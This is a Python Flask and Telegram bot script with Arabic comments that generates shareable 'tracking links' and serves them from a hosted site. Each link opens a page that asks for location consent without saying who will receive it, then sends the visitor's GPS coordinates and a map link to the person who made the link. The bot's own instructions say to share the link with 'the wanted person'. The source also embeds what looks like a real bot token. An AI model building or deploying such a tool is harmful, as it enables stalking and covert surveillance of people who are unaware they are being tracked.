"""
بوت تتبع المواقع - Telegram Location Tracking Bot
نسخة مباشرة بدون threading
البوت: @cccc00bot
"""

from flask import Flask, request, jsonify, render_template_string
import telebot
import logging
import os
import secrets
import time
from datetime import datetime, timedelta
import sys

# ========== إعدادات Logging محسنة ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    stream=sys.stdout  # تأكد من ظهور الـ Logs في Render
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== إعدادات البوت ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

# ========== تخزين البيانات ==========
tracking_links = {}
user_data = {}

# ========== متغيرات التتبع ==========
bot_start_time = datetime.now()
bot_connected = False

# ========== محاولة الاتصال بالبوت ==========
def connect_bot():
    """محاولة الاتصال بـ Telegram API"""
    global bot_connected
    try:
        logger.info("🔍 محاولة الاتصال بـ Telegram API...")
        bot_info = bot.get_me()
        bot_connected = True
        logger.info(f"✅ الاتصال ناجح! البوت: @{bot_info.username}")
        logger.info(f"🤖 اسم البوت: {bot_info.first_name}")
        return True
    except Exception as e:
        bot_connected = False
        logger.error(f"❌ فشل الاتصال: {e}")
        return False

# حاول الاتصال فوراً
connect_bot()

# ========== الصفحة الرئيسية ==========
@app.route('/')
def home():
    """الصفحة الرئيسية"""
    return f'''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>📍 بوت التتبع</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 50px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }}
            .container {{
                background: rgba(255, 255, 255, 0.1);
                padding: 40px;
                border-radius: 20px;
                backdrop-filter: blur(10px);
                max-width: 600px;
                margin: 0 auto;
            }}
            .status {{
                background: rgba(255, 255, 255, 0.2);
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
            }}
            .btn {{
                display: inline-block;
                padding: 12px 24px;
                background: #48bb78;
                color: white;
                text-decoration: none;
                border-radius: 8px;
                margin: 10px;
                font-weight: bold;
            }}
            .btn:hover {{
                background: #38a169;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📍 بوت تتبع المواقع</h1>
            <div class="status">
                <p>✅ الخدمة تعمل</p>
                <p>🤖 البوت: @cccc00bot</p>
                <p>📊 الحالة: {'🟢 متصل' if bot_connected else '🔴 غير متصل'}</p>
                <p>🔗 الروابط النشطة: {len(tracking_links)}</p>
                <p>👥 المستخدمين: {len(user_data)}</p>
                <p>⏰ وقت البدء: {bot_start_time.strftime("%Y/%m/%d %I:%M %p")}</p>
            </div>
            <div>
                <a href="/health" class="btn">فحص الصحة</a>
                <a href="/reconnect" class="btn">إعادة الاتصال</a>
                <a href="/test_bot" class="btn">اختبار البوت</a>
            </div>
            <div style="margin-top: 30px;">
                <p>🚀 <strong>للاستخدام:</strong></p>
                <p>1. افتح Telegram</p>
                <p>2. ابحث عن @cccc00bot</p>
                <p>3. أرسل /start</p>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    """فحص صحة الخادم"""
    return jsonify({
        'status': 'healthy',
        'service': 'telegram-tracking-bot',
        'bot': '@cccc00bot',
        'bot_connected': bot_connected,
        'bot_start_time': bot_start_time.isoformat(),
        'active_links': len(tracking_links),
        'total_users': len(user_data),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/reconnect')
def reconnect():
    """إعادة الاتصال بالبوت"""
    success = connect_bot()
    if success:
        return jsonify({
            'success': True,
            'message': 'تم الاتصال بالبوت بنجاح',
            'bot': '@cccc00bot'
        })
    else:
        return jsonify({
            'success': False,
            'error': 'فشل الاتصال بالبوت'
        }), 500

@app.route('/test_bot')
def test_bot():
    """اختبار البوت"""
    try:
        bot_info = bot.get_me()
        return jsonify({
            'success': True,
            'bot': {
                'username': bot_info.username,
                'first_name': bot_info.first_name,
                'id': bot_info.id
            },
            'connected': True,
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e),
            'connected': False
        }), 500

# ========== معالجات البوت ==========
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """معالجة أمر /start"""
    try:
        user_id = message.from_user.id
        username = message.from_user.username or "بدون"
        first_name = message.from_user.first_name or "مستخدم"
        
        logger.info(f"📩 استقبل /start من: {username} ({first_name})")
        
        # حفظ بيانات المستخدم
        user_data[user_id] = {
            'name': first_name,
            'username': username,
            'first_seen': datetime.now(),
            'last_active': datetime.now()
        }
        
        response = f"""
🎯 **مرحباً {first_name}!** 👋

📍 **بوت تتبع المواقع الآمن**
🤖 **البوت:** @cccc00bot

🚀 **الأوامر المتاحة:**
📍 `/newlink` - إنشاء رابط تتبع جديد
📊 `/mylinks` - عرض روابطك النشطة
🔄 `/reset` - حذف جميع روابطك
📈 `/stats` - إحصائياتك
❓ `/help` - المساعدة
🔧 `/status` - حالة البوت

💡 **ابدأ الآن:** أرسل `/newlink`
        """
        
        bot.reply_to(message, response)
        logger.info(f"✅ تم الرد على {username}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في /start: {e}")

@bot.message_handler(commands=['newlink'])
def handle_newlink(message):
    """إنشاء رابط تتبع جديد"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # إنشاء معرف فريد
        tracking_id = secrets.token_urlsafe(12)
        
        # حفظ الرابط
        tracking_links[tracking_id] = {
            'chat_id': chat_id,
            'user_id': user_id,
            'created_at': datetime.now(),
            'expires_at': datetime.now() + timedelta(hours=24),
            'active': True,
            'visits': 0,
            'successful_tracks': 0
        }
        
        # تحديث بيانات المستخدم
        if user_id in user_data:
            user_data[user_id]['last_active'] = datetime.now()
        
        # إنشاء الرابط
        tracking_url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{tracking_id}'
        
        response = f"""
✅ **تم إنشاء رابط تتبع جديد!**

🔗 **الرابط:**
`{tracking_url}`

🆔 **الكود:** `{tracking_id}`
⏰ **الصلاحية:** 24 ساعة
📊 **الحالة:** نشط 🔵

📋 **طريقة الاستخدام:**
1. شارك هذا الرابط مع الشخص المطلوب
2. عند فتح الرابط، سيطلب الإذن للوصول للموقع
3. سيصلك إشعار فوري عند تحديد الموقع
        """
        
        bot.reply_to(message, response)
        logger.info(f"📝 تم إنشاء رابط: {tracking_id}")
        
    except Exception as e:
        logger.error(f"❌ خطأ في newlink: {e}")

@bot.message_handler(commands=['status'])
def handle_status(message):
    """حالة البوت"""
    try:
        status_text = f"""
🟢 **حالة النظام:**

🤖 **البوت:** @cccc00bot
🌐 **الحالة:** {'🟢 متصل' if bot_connected else '🔴 غير متصل'}
⏰ **وقت التشغيل:** {bot_start_time.strftime('%Y/%m/%د %I:%M:%S %p')}
🔗 **الروابط النشطة:** {len(tracking_links)}
👥 **المستخدمين:** {len(user_data)}

🕒 **الوقت الحالي:** {datetime.now().strftime('%Y/%m/%d %I:%M:%S %p')}
        """
        
        bot.reply_to(message, status_text)
        
    except Exception as e:
        logger.error(f"❌ خطأ في status: {e}")

# ========== صفحة التتبع ==========
@app.route('/track/<tracking_id>')
def track_page(tracking_id):
    """صفحة طلب الموقع"""
    if tracking_id in tracking_links:
        link_info = tracking_links[tracking_id]
        
        # التحقق من الصلاحية
        if datetime.now() > link_info['expires_at']:
            link_info['active'] = False
            return '''
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>انتهت الصلاحية</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; }
                </style>
            </head>
            <body>
                <h1>⏰ انتهت صلاحية الرابط</h1>
                <p>رابط التتبع هذا لم يعد فعالاً</p>
            </body>
            </html>
            '''
        
        # زيادة الزيارات
        link_info['visits'] += 1
        
        return '''
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>طلب الموقع</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
                .btn { background: #48bb78; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>📍 طلب الوصول إلى الموقع</h1>
            <button class="btn" onclick="getLocation()">✅ موافق ومتابعة</button>
            <script>
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                const data = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    tracking_id: "''' + tracking_id + '''"
                                };
                                
                                fetch('/track', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify(data)
                                }).then(() => {
                                    document.body.innerHTML = "<h1>✅ تم بنجاح</h1>";
                                });
                            },
                            function(error) {
                                alert("فشل: " + error.message);
                            }
                        );
                    } else {
                        alert("المتصفح لا يدعم الموقع");
                    }
                }
            </script>
        </body>
        </html>
        '''
    
    return "رابط غير صالح", 404

@app.route('/track', methods=['POST'])
def handle_track():
    """معالجة بيانات الموقع"""
    try:
        data = request.get_json()
        tracking_id = data.get('tracking_id')
        
        if tracking_id in tracking_links:
            link_info = tracking_links[tracking_id]
            chat_id = link_info['chat_id']
            lat = data.get('latitude')
            lon = data.get('longitude')
            
            # إرسال الموقع
            try:
                bot.send_message(
                    chat_id,
                    f"""📍 **موقع جديد!**

الإحداثيات: `{lat}`, `{lon}`
الخريطة: https://maps.google.com/?q={lat},{lon}"""
                )
                
                # تحديث الإحصائيات
                link_info['successful_tracks'] += 1
                
                return jsonify({'success': True})
                
            except Exception as e:
                logger.error(f"❌ خطأ في إرسال للبوت: {e}")
                return jsonify({'error': 'فشل في إرسال للبوت'}), 500
            
        return jsonify({'error': 'رابط غير صالح'}), 400
        
    except Exception as e:
        logger.error(f"❌ خطأ في معالجة التتبع: {e}")
        return jsonify({'error': str(e)}), 500

# ========== بدء Polling في خلفية ==========
def start_polling():
    """بدء Polling في خلفية"""
    logger.info("🚀 بدء Polling للبوت...")
    
    max_retries = 5
    retry_delay = 10  # ثواني
    
    for attempt in range(max_retries):
        try:
            logger.info(f"🔄 محاولة {attempt + 1}/{max_retries}...")
            
            # اختبار الاتصال أولاً
            bot_info = bot.get_me()
            logger.info(f"✅ البوت متصل: @{bot_info.username}")
            
            # بدء Polling
            logger.info("🎯 بدء استقبال الرسائل...")
            bot.polling(none_stop=True, timeout=30, long_polling_timeout=30)
            
            # إذا وصلنا هنا، فقد توقف Polling
            logger.warning("⚠️ توقف Polling")
            break
            
        except Exception as e:
            logger.error(f"❌ خطأ في Polling (المحاولة {attempt + 1}): {e}")
            
            if attempt < max_retries - 1:
                logger.info(f"⏳ الانتظار {retry_delay} ثانية للمحاولة التالية...")
                time.sleep(retry_delay)
                retry_delay *= 2  # زيادة وقت الانتظار
            else:
                logger.error("❌ فشلت جميع محاولات Polling")

# ========== بدء التشغيل ==========
if __name__ == '__main__':
    # تسجيل بدء التشغيل
    logger.info("=" * 50)
    logger.info("🚀 بدء تشغيل نظام التتبع...")
    logger.info(f"🤖 البوت: @cccc00bot")
    logger.info("=" * 50)
    
    # محاولة الاتصال بالبوت
    if connect_bot():
        # بدء Polling في خلفية
        import threading
        polling_thread = threading.Thread(target=start_polling, daemon=True)
        polling_thread.start()
        logger.info("✅ بدأ خيط Polling في الخلفية")
    else:
        logger.error("❌ فشل الاتصال بالبوت، سيحاول خيط Polling الاتصال تلقائياً")
        # بدء Polling مع محاولات الاتصال
        polling_thread = threading.Thread(target=start_polling, daemon=True)
        polling_thread.start()
    
    # تشغيل خادم Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 بدء خادم Flask على المنفذ {port}")
    logger.info("=" * 50)
    logger.info("✅ النظام جاهز!")
    logger.info("=" * 50)
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)